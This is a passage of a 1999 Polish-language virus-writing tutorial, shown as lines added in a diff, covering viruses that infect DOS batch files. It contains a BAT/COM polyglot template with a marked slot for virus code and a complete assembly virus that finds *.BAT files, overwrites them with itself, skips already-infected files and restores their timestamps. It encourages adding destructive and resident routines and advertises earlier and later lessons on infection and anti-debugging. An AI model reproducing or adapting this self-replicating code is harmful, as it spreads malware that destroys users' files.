+;----tu-sie-konczy-----------------------------------------------------------
+
+
+ 7. WIRUSY PLIKOW TYPU BAT
+ =========================
+
+    Jak wiadomo wirusy moga zarazac doslownie kazdy rodzaj pliku, ktory tylko
+ zawiera jakis kod wykonywalny. Do takich plikow naleza miedzy innymi pliki
+ typu .BAT. Choc nie zawieraja one kodu maszynowego, jednak moga byc
+ wykonywane.
+    Kluczem do napisania wirusa plikow .BAT jest przedstawiony ponizej
+ program BATCOM, ktory po asemblacji do pliku typu .COM moze byc uruchamiany
+ zarowno z rozszerzeniem .BAT jak i .COM czy nawet .EXE. Jesli program
+ zostanie uruchomiony jako COM/EXE wypisze o tym komunikat. Jesli zostanie
+ uruchomiony jako BAT, rowniez wypisze komunikat, po czym skopiuje sie do
+ pliku COM i uruchomi. Proste. Program wykorzystuje fakt, ze etykiety w
+ plikach .BAT zaczynaja sie od znaku ":". Dlatego caly BATCOM zaczyna sie od
+ ": ", co jest odpowiednikiem instrukcji cmp ah,[bx+si], ktora w sumie nie
+ robi nic waznego (to znaczy robi, ale w naszym przypadku nie ma to wplywu na
+ dalszy przebieg wykonywania programu).
+
+
+;<------- BATCOM.ASM --------- (c) 1999 MBR Labs. ---------------------
+
+.model  tiny
+.code
+        org     100h
+
+start:  db      ': '            ; cmp ah,[bx+si] - nic nieznaczaca instrukcja,
+        jmp     dalej           ; ale w ASCII zaczyna sie od ":", jak etykieta
+        db      13,10,'@echo off'                               ; w BAT-ach
+        db      13,10,'echo Program uruchomiony jak BATCOM.BAT.'
+        db      13,10,'echo Kopiowanie do pliku .COM.....'
+        db      13,10,'copy %0 tmpÿABCD.com >nul'
+        db      13,10,'echo Wykonywanie pliku .COM.....'
+        db      13,10,'tmpÿABCD.com'
+        db      13,10,'echo Kasowanie pliku .COM......'
+        db      13,10,'del tmpÿABCD.com >nul'
+        db      13,10,'goto  '
+        db      13,10
+
+;----- Tutaj mozna wstawic kod wirusa
+
+dalej:  mov     ah,9
+        mov     dx,(offset napis)
+        int     21h
+        ret
+
+napis   db      '>>> Program wykonywany jako BATCOM.COM.',13,10,'$'
+
+;----- Tutaj wirus powinien sie konczyc
+
+        db      13,10,': '
+info    db      'BATCOM / (c) 1999 MBR Labs',0
+
+        end     start
+
+;<------- koniec BATCOM.ASM --------- (c) 1999 MBR Labs. ---------
+
+******************************************************************
+  To byl tylko opis budowy takich wirusow. Ponizej znajduje sie bardzo
+prosty wirus, ktory wlasnie uzywa tej procedury.
+
+
+;<------- VIR.ASM --------- (c) 1999 MBR Labs & BINBOY -----------
+.model  tiny
+.code
+           org 100h
+
+start:  db  ": "                                ; razem z nastepna instrukcja
+        jmp virus                               ; tworzy etykiete (nie wazne)
+        db 13,10,"@ECHO OFF"                    ; wylaczenie wyswietlania
+        db 13,10,"copy %0 ABCD.COM>NUL"         ; skopiowanie sie jako COM
+        db 13,10,"ABCD.COM"                     ; i uruchomienie, teraz VIRUS
+        db 13,10,"del ABCD.COM >NUL"            ; skasowanie COM-a
+        db 13,10,"GOTO X"                       ; skok na koniec
+        db 13,10
+virus:                                          ; tu zaczyna sie wirus
+        mov   ah,4eh                            ; szukanie pliku
+        xor   cx,cx                             ; o dowolnych atrybutach
+        mov   dx,offset maska                   ; *.BAT
+szukaj:
+        int   21h
+        jc    etyk2                             ; jesli nie znaleziono, to skok
+        call  infekcja                          ; jesli znaleziono to infekcja
+        mov   ah,4fh                            ; szukanie kolejnego pliku
+        jmp   szukaj
+etyk2:
+        mov   ax,4c00h                          ; zakonczenie programu
+        int   21h
+infekcja:
+        mov   ax,3d02h                          ; otwarcie pliku
+        mov   dx,09eh                           ; o nazwie w DTA
+        int   21h
+        xchg  bx,ax                             ; do BX numer dojscia
+        mov   ah,3fh                            ; przeczytanie z pliku
+        mov   cx,2                              ; dwoch bajtow i zapamietanie
+        mov   dx,offset bufor                   ; ich w buforze
+        int   21h
+        cmp   word ptr bufor,0203Ah             ; jesli te dwa bajty to 0203AH
+        je    koniec_inf                        ; to koniec infekcji
+        xor   dx,dx                             ; DX=0
+        mov   cx,dx                             ; CX=0
+        mov   ax,4200h                          ; ustawienie kursora na
+                                                ; poczatku pliku
+        int   21h
+        mov   al,0                              ; sprawdzenie daty i czasu
+        mov   ah,57h                            ; ostatniej modyfikacji pliku
+        int   21h
+        push  cx                                ; zapamietanie ich na
+        push  dx                                ; stosie
+        mov   ah,40h                            ; zapisanie wirusa w pliku
+        mov   cx,offset koniec-100h             ; poczawszy od 100H, czyli
+        mov   dx,100h                           ; poczatku wirua
+        int   21h
+        mov   al,1                              ; zmiana na zapamietane
+        pop   dx                                ; wczesniej na
+        pop   cx                                ; stosie daty i czasu
+        mov   ah,57h                            ; ostatniej modyfikacji
+        int   21h
+koniec_inf:
+        mov   ah,3eh                            ; zamkniecie pliku
+        int   21h
+        ret
+bufor   dw 0
+maska   db "*.BAT",0
+koniec: DB 13,10,":X"
+END
+;<------- koniec VIR.ASM --------- (c) 1999 MBR Labs & BINBOY ---------
+
+******************************************************************
+  Tego wirusa nie trzeba chyba tlumaczyc, ale dla bardziej ulomnych...;-)
+Po skompilowaniu go na COM-a zmieniamy jego nazwe na BAT. Wowczas ten BAT
+jest wlasnie wirusem. Jak dziala??.. Otoz po uruchomieniu jako BAT wirus
+kopiuje samego siebie do pliku tymczasowego ABCD.COM. Nastepnie uruchamia go.
+Po jego zakonczeniu zostaje on usuniety i program sie wylacza. Jesli plik
+zostanie uruchomiony jako COM (ABCD.COM) instrukcja JMP spowoduje skok do
+wlasciwej procedury zarazania pliku. Wowczas zostaje odszukany jakis COM, 
+do ktorego wirus sam siebie dopisuje. Dopisywany plik nie zmienia swojej
+objetosci, ani daty i czasu ostatniej modyfikacji. Wirus zabezpieczony
+jest rowniez przed zarazaniem pliku juz zarazonego.
+  Jest on bardzo prosty. Sluzy tylo jako przyklad. Mozna przeciez zrobic
+wirusa BAT-ow, ktory bedzie rezydentny. Dodac jakas procedure destrukcyjna,
+itp. Sposobow jest wiele.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-KONIEC=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+  No i zakonczyla sie kolejna czesc FAQ. Nauczylismy sie do tej pory zarazac
+pliki COM i BAT. Pliki COM potrafimy zarazic tak, by sie daly juz naprawic, ale
+i potrafimy zrobic tak, by wirus dokleil sie na koncu pliku. Nauczylismy sie
+rowniez jak sie robi proste wirusy rezydentne. Umiemy stworzyc jakas ciekawa
+procedure destrukcyjna. Potrafimy takze zabezpieczyc naszego "insekta" przed
+debuggowaniem i przed disassemblacja. Postawilismy wiec duzy krok. Przed nami
+wirusy plikow EXE. Wirusow tego typu jest najwiecej. Sa one trudniejsze od
+COM-ow. Trzeba wykonywac znacznie wiecej obliczen. W kolejnym FAQ zajmiemy
+sie wlasnie nimi. Stworzymy prostego wirusa EXE-kow. Zajmiemy sie rowniez
+wirusami BootSektora i MBR (Master Boot Record).
+
+
+        Serdecznie zapraszam. I czekam na listy: BINARY@POLBOX.COM
+                                                 BINBOY@FREE.COM.PL
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-
+   Czekam na pytania i sugestie:   "MATII"
+            BINARY@POLBOX.COM
+            BINBOY@FREE.COM.PL
+                              /_MaTiI_\
+                              \1999////
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-
+HTTP://WWW.FREE.COM.PL/BINBOY
+kontakt:
+  binboy@free.com.pl
+  binboy@friko6.onet.pl
+-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+EOF
